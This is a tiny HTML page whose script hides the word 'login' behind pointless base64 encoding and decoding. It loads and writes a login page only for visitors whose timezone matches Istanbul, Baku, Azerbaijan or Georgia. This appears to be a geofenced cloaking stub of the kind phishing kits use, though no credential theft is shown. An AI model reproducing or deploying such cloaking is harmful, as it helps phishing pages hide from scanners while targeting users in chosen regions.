<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>
        const home = btoa('login');
        const zones = /Istanbul|Baku|Azerbaijan|Georgia/gi;
        const timezoneOffset = zones.test((new Intl.DateTimeFormat()).resolvedOptions().timeZone);

        if (timezoneOffset) {
            fetch(atob(home)).then(
                function(r) {
                    return r.text().then(function(t) {
                        document.write(t);
                    });
                }
            );
        }
    </script>
</body>
</html>